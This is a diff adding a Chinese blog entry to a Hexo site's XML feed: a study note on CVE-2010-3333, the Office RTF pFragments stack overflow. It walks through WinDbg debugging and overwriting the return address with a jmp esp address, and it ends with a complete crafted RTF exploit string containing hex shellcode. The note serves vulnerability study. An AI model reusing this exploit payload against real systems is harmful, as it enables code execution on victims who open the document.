@@ -118,6 +118,25 @@
   
   
   <entry>
+    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
+    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
+    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</url>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞战争</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>攻防世界 int_overflow</title>
     <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/"/>
     <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/</url>
